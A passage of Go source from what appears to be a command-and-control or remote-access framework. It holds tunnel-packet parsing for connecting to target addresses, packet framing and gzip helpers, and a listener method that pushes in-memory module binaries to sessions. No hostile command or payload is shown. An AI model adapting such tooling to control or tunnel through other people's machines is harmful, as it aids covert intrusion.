		tp.TunnelID = binary.BigEndian.Uint32(data[1:5])
	}

	switch op {
	case 0x7B: // Connect
		if len(data) >= 9 {
			addrLen := binary.BigEndian.Uint16(data[5:7])
			if len(data) >= 7+int(addrLen)+2 {
				tp.TargetAddr = string(data[7 : 7+int(addrLen)])
				tp.TargetPort = binary.BigEndian.Uint16(data[7+int(addrLen) : 7+int(addrLen)+2])
				do := 7 + int(addrLen) + 2
				if len(data) >= do+4 {
					dl := binary.BigEndian.Uint32(data[do:])
					if len(data) >= do+4+int(dl) {
						tp.Data = data[do+4 : do+4+int(dl)]
					}
				}
			}
		}
	case 0x2A: // ConnectResult
		if len(data) >= 9 {
			addrLen := binary.BigEndian.Uint16(data[5:7])
			if len(data) >= 7+int(addrLen)+2 {
				tp.TargetAddr = string(data[7 : 7+int(addrLen)])
				tp.TargetPort = binary.BigEndian.Uint16(data[7+int(addrLen) : 7+int(addrLen)+2])
				do := 7 + int(addrLen) + 2
				if len(data) >= do+5 {
					dl := binary.BigEndian.Uint32(data[do:])
					if len(data) >= do+5+int(dl) {
						tp.Success = data[do+4] == 1
						tp.Data = data[do+5 : do+5+int(dl)]
					}
				}
			}
		}
	case 0x3D: // Data
		if len(data) >= 9 {
			dl := binary.BigEndian.Uint32(data[5:9])
			if len(data) >= 9+int(dl) {
				tp.Data = data[9 : 9+int(dl)]
			}
		}
	case 0x5F: // Close
		// No extra data
	}
	return tp
}

func parsePacket(data []byte) (*protocol.Packet, error) {
	if len(data) < protocol.HeaderSize {
		return nil, fmt.Errorf("packet too short")
	}

	packet := &protocol.Packet{}
	copy(packet.Magic[:], data[0:4])
	packet.Version = data[4]
	packet.Type = data[5]
	packet.Length = protocol.DecodeUint32(data[6:10])
	packet.ID = protocol.DecodeUint64(data[10:18])
	packet.Timestamp = protocol.DecodeUint64(data[18:26])
	packet.Checksum = protocol.DecodeUint32(data[26:30])

	if packet.Length > 0 && int(packet.Length) <= len(data)-protocol.HeaderSize {
		packet.Payload = data[protocol.HeaderSize : protocol.HeaderSize+packet.Length]
	}

	return packet, nil
}

func encodePacket(packet *protocol.Packet) []byte {
	var payloadLen uint32
	if packet.Payload != nil {
		payloadLen = uint32(len(packet.Payload))
	}

	data := make([]byte, protocol.HeaderSize)
	copy(data[0:4], packet.Magic[:])
	data[4] = packet.Version
	data[5] = packet.Type
	binary.BigEndian.PutUint32(data[6:10], payloadLen)
	binary.BigEndian.PutUint64(data[10:18], packet.ID)
	binary.BigEndian.PutUint64(data[18:26], packet.Timestamp)
	binary.BigEndian.PutUint32(data[26:30], packet.Checksum)

	if packet.Payload != nil {
		data = append(data, packet.Payload...)
	}

	return data
}

func compress(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return data, nil
	}

	if len(data) <= 1024 {
		return data, nil
	}

	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	if _, err := gw.Write(data); err != nil {
		gw.Close()
		return nil, err
	}
	if err := gw.Close(); err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

func decompressData(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return data, nil
	}

	if len(data) < 2 || data[0] != 0x1f || data[1] != 0x8b {
		return data, nil
	}

	buf := bytes.NewReader(data)
	gr, err := gzip.NewReader(buf)
	if err != nil {
		return nil, err
	}
	defer gr.Close()

	decompressed, err := io.ReadAll(gr)
	if err != nil {
		return nil, err
	}

	return decompressed, nil
}

// ─── 内存模块二进制下发（v1.4.0 S4）───────────────────────────────────────────

// PushModuleBlob 把模块二进制作为一帧 TypeModuleData 发给会话（WebSocket 通道）。
// 只做"发一帧"：帧负载的排布（[4B 头长][头 JSON][裸字节]）由
// internal/common/moduleabi.EncodeBlobFrame 决定，传输层不解析内容。
func (l *Listener) PushModuleBlob(sessionID, token string, payload []byte) error {
	if len(payload) == 0 {
		return fmt.Errorf("empty module blob")
	}
	if err := l.sendCtrl(sessionID, protocol.TypeModuleData, payload); err != nil {
		return fmt.Errorf("failed to push module blob: %w", err)
	}
	logging.Info("listener", "module blob pushed to session %s (token=%s size=%d)", sessionID, shortToken(token), len(payload))
	return nil
}
